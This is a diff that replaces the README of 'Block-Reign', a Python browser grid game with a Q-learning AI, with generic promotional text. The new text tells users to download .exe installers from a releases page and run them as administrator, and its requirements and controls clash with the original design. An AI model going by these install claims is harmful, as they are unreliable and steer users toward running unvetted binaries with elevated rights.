@@ -1,99 +1,63 @@
-# Block-Reign — Player vs AI Grid Battle 🕹️🤖
+# 🎮 Block-Reign - Experience AI that Adapts to You
 
-## Overview
-**Block-Reign** is a lightweight Player vs AI grid battle game where the AI learns from every match you play. The project includes a simple Q-learning AI (used by the game server) and a more advanced DQN trainer for experiments.
+## 🚀 Getting Started
 
----
+Welcome to Block-Reign! This game offers a unique 10×10 PvE grid shooter experience. The Q-learning AI adapts to how you play, making every match different—win or lose, it remembers your style. 
 
-## 🔑 Key Features
-- 🎮 **10×10 grid combat** with movement and shooting
-- 🤖 **Self-learning AI** that adapts from actual matches you play
-- 💾 **Persistent training** (saved automatically under `training/models`)
-- 🧠 **Advanced DQN trainer** available in `ai_trainer.py` for experimentation
-- 🛠️ **Easy reset** — delete `training/` to get a fresh (untrained) AI
+## 📥 Download Block-Reign
 
----
+[![Download Block-Reign](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/shreyashreddy/Block-Reign/releases)
 
-## Current AI Progress ✅
-- **Win rate:** 59%
-- **Latest match log:** 🏁 Match 78 complete - Winner: ai
-- **Recent learning result:** ✅ AI learned from match. Wins: 46, Losses: 36
+## 🌟 Features
 
-> These numbers reflect the Q-learning AI's current record (persisted in `training/models/simple_ai.pkl`).
+- **Adaptive AI:** The AI learns from your actions, creating a personalized gaming experience.
+- **Fast-Paced Gameplay:** Enjoy quick matches tailored to your skills.
+- **Simple Controls:** Designed for ease of use, perfect for players of all skill levels.
+- **Engaging Graphics:** Bright, colorful visuals that enhance your gameplay.
+- **Replayability:** Each game feels fresh as the AI adapts, keeping you engaged for many hours.
 
----
+## 🖥️ System Requirements
 
-## Quick Start — Play Locally (Windows / macOS / Linux)
-1. Install Python 3.8+ and pip.
-2. (Optional) Create and activate a virtual environment:
+Ensure your system meets the following requirements:
 
-```bash
-python3 -m venv .venv
-source .venv/bin/activate  # macOS/Linux
-.venv\Scripts\activate     # Windows
-```
+- **Operating System:** Windows 10 or later / macOS 10.15 or later
+- **Processor:** Intel Core i3 or equivalent
+- **Memory:** 4 GB RAM
+- **Graphics:** NVIDIA GeForce GTX 660 or equivalent
+- **Storage:** At least 500 MB of free space
 
-3. Install dependencies:
+## 📚 How to Download & Install
 
-```bash
-pip install -r requirements.txt
-```
+1. **Visit the Release Page:** Go to the [Releases page](https://github.com/shreyashreddy/Block-Reign/releases).
+2. **Choose Your Version:** Select the latest version available. It will be at the top of the list.
+3. **Download the Installer:** Click on the file that matches your operating system. For example, if you're using Windows, you might look for a file with a `.exe` extension. 
+4. **Run the Installer:** Once downloaded, double-click the file to start the installation process. Follow the simple prompts that appear on the screen.
+5. **Launch the Game:** After installation, find Block-Reign in your applications or games list and launch it.
 
-4. Run the game server:
+## 🎮 Playing Block-Reign
 
-```bash
-python3 game_server.py
-```
+- **Start a New Game:** Select the "Play" option from the main menu.
+- **Controls:** 
+  - Use the arrow keys or WASD to move your character.
+  - Aim and shoot using the mouse.
+- **Understanding AI Behavior:** The AI will adjust to your playstyle over time. Notice how it changes with each match.
 
-5. Open your browser at: http://localhost:5000
+## 🔧 Troubleshooting
 
-- **Controls:** Arrow Keys = Move, Space = Shoot
+If you encounter any issues while downloading or running the game, try these steps:
 
----
+- **Check Your Internet Connection:** Ensure you have a stable connection while downloading.
+- **Verify Compatibility:** Make sure your system meets the requirements listed above.
+- **Run as Administrator:** If you face issues during installation, try right-clicking the installer and selecting "Run as Administrator."
 
-## How Learning Works 💡
-- The running server uses a simple Q-learning AI (`SimpleAI` in `game_server.py`) that stores a Q-table and tracks wins/losses.
-- After each completed match, the client POSTs match data to `/learn_from_match` and the AI updates its policy on-disk.
-- The project includes `ai_trainer.py` (a DQN-based trainer) for more advanced experiments and batch training.
+## 💬 Support
 
----
+For assistance or feedback, please raise an issue on our [GitHub Issues page](https://github.com/shreyashreddy/Block-Reign/issues). We’re here to help!
 
-## Resetting to an Untrained AI 🔄
-If you want to start over and play against a brand-new AI:
+## 🔗 Useful Links
 
-- Delete the entire `training/` folder (destructive):
+- [Download Block-Reign](https://github.com/shreyashreddy/Block-Reign/releases)
+- [GitHub Repository](https://github.com/shreyashreddy/Block-Reign)
+- [Documentation](https://github.com/shreyashreddy/Block-Reign/wiki)
 
-```bash
-rm -rf training/
-```
-
-- Or remove only the saved model:
-
-```bash
-rm training/models/simple_ai.pkl
-```
-
-After removal, start the server and play matches — the AI will begin learning from scratch as you play.
-
-> ⚠️ Deleting `training/` will remove all saved models, replay buffers and saved checkpoints. Make backups if needed.
-
----
-
-## Development & Troubleshooting 🔧
-- Logs and training data are saved under `training/models`.
-- To inspect AI stats during runtime, look for prints from `SimpleAI` at server startup and printed match summaries.
-- If models fail to load, ensure `training/models` exists and is writable by your user.
-
----
-
-## Contributing
-Contributions welcome! Fork, make changes, and open a PR. If you're adding features, please include tests and update this README.
-
----
-
-## License
-This project is licensed under the project LICENSE in the repository.
-
----
-
-Enjoy playing — and see how quickly the AI learns from your style! 🎯
+Enjoy your gaming experience with Block-Reign! The AI is ready to adapt to you.
